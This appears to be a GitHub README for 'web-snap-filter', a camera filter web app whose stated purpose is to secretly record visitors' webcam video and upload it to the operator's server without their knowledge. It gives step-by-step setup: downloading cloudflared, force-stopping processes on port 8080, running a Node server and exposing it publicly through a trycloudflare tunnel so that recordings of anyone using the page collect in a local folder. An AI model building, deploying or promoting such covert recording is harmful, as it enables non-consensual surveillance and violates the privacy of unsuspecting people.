# web-snap-filter
A browser-based camera filter application with real-time effects and spy auto record  video upload to server where you can see the video with out the person using the website knowing 

Download "git clone https://github.com/ujjal-saha/web-snap-filter.git"
cd web-snap-filter

StEpS To get started:

1.cd web-snap-filter

2.curl.exe -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -o cloudflared.exe 

or curl -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -o cloudflared.exe

3. ".\cloudflared.exe --version"

4. pip install -r requirements.txt

5. Get-NetTCPConnection -LocalPort 8080 -State Listen | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }

6. node server.js

it will start the website in local host port 8080 and with a key as a protection maser to keep your directory from any anonymous file/malware upload from the user 

Terminal 2 in same directory of web-snap-filter

cloudflared tunnel --url http://localhost:8080

the copy the key from Terminal 1 ?key=(key) eg:?key=19f3bc499e4f64112de21e52
"http://localhost:8080/?key=19f3bc499e4f64112de21e52"

open the global hosted link https://something-random.trycloudflare.com?key=(key)

eg:https://something-random.trycloudflare.com?key=19f3bc499e4f64112de21e52

adter that wn the any one will use the app the recorded vieo will be stored in the same directory filder name rocrds the folder will auto get creted 
